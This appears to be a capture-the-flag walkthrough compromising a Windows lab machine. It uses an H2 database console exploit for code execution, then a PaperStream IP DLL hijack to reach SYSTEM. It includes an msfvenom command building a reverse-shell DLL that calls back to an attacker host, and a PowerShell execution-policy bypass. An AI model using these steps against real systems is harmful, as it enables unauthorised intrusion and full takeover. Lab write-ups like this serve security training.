
![](https://miro.medium.com/v2/resize:fit:400/0*s5RM47pWQThU4sa9.jpeg)

- Network scan

```c
PORT      STATE SERVICE       VERSION  
80/tcp    open  http          Microsoft IIS httpd 10.0  
| http-methods:   
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: H2 Database Engine (redirect)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds?  
5040/tcp  open  unknown  
8082/tcp  open  http          H2 database http console  
|_http-title: H2 Console  
9092/tcp  open  XmlIpcRegSvc?  
49664/tcp open  unknown  
49665/tcp open  unknown  
49666/tcp open  unknown  
49667/tcp open  unknown  
49668/tcp open  unknown  
49669/tcp open  unknown

```
- 8082 (H2)

![](https://miro.medium.com/v2/resize:fit:700/1*Cu8xGUv2okjvnu343SwnkA.png)

Search for a suitable exploit in the H2 database.


## Offensive Security's Exploit Database Archive

### H2 Database 1.4.199 - JNI Code Execution.. local exploit for Java platform

www.exploit-db.com



](https://www.exploit-db.com/exploits/49384?source=post_page-----5233e3d6f5e--------------------------------)

![](https://miro.medium.com/v2/resize:fit:700/1*PcVrwf4AqGEPGuAB_2iiZg.png)

When we open the file, we see the commands we need.

![](https://miro.medium.com/v2/resize:fit:700/1*1egXU9u1lSexWHjp4gp2zQ.png)

We enter one by one. As a result, we are successful.

![](https://miro.medium.com/v2/resize:fit:700/1*MPitfLJlgH5Rb36_-zYwQw.png)

- reverse

Since we can rce, let’s get reverse shell. Let’s load the payload we prepared for this into the system.

![](https://miro.medium.com/v2/resize:fit:700/1*Ca6c423dFs8KYfh3MScEFw.png)

Let’s run the file we uploaded.

![](https://miro.medium.com/v2/resize:fit:700/1*XWb0qf9OasdRL03KFriweA.png)

#### privesc

In the program list, we see a folder that is unfamiliar to us.

```c
C:\Program Files (x86)>dir  
dir  
 Volume in drive C has no label.  
 Volume Serial Number is AC2F-6399  
  
 Directory of C:\Program Files (x86)  
  
04/27/2020  08:01 PM    <DIR>          .  
04/27/2020  08:01 PM    <DIR>          ..  
04/27/2020  07:59 PM    <DIR>          Common Files  
04/27/2020  08:01 PM    <DIR>          fiScanner  
04/27/2020  07:59 PM    <DIR>          H2  
05/03/2022  05:22 PM    <DIR>          Internet Explorer  
03/18/2019  08:52 PM    <DIR>          Microsoft.NET  
04/27/2020  08:01 PM    <DIR>          PaperStream IP  
03/18/2019  10:20 PM    <DIR>          Windows Defender  
03/18/2019  08:52 PM    <DIR>          Windows Mail  
04/24/2020  08:50 AM    <DIR>          Windows Media Player  
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform  
03/18/2019  09:02 PM    <DIR>          Windows NT  
03/18/2019  10:23 PM    <DIR>          Windows Photo Viewer  
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices  
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell  
               0 File(s)              0 bytes  
              16 Dir(s)   7,243,313,152 bytes free
```

When we investigate, we see that we can increase the power with this.

![](https://miro.medium.com/v2/resize:fit:700/1*jwX_akJ2xeE9jBAZ2vI7SQ.png)

Looking at the code, we will need the .dll file. Let’s prepare a malicious file for this

```c
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.xx.xx LPORT=139 -f dll > exploit.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload  
No encoder specified, outputting raw payload  
Payload size: 324 bytes  
Final size of dll file: 8704 bytes
```
  


Change the direction from the content of the code

![](https://miro.medium.com/v2/resize:fit:700/1*lN2D5AfGVXKiznG2Htzejw.png)

Load the payloads to the target system…

![](https://miro.medium.com/v2/resize:fit:700/1*PQ3rMVlosecIE_csPkX5fg.png)

Solve the problem.

`C:\Program Files (x86)>set PATH=%SystemRoot%\system32;%SystemRoot%;`

![](https://miro.medium.com/v2/resize:fit:700/1*EvDTqzgYHz_MqBbrJuiG2w.png)

Open the listener and run our payload.

`C:\temp>C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\temp\49382.ps1`

![](https://miro.medium.com/v2/resize:fit:700/1*DA_D8accAXHHe0NMNQ1oGQ.png)

# _And now we are the System_

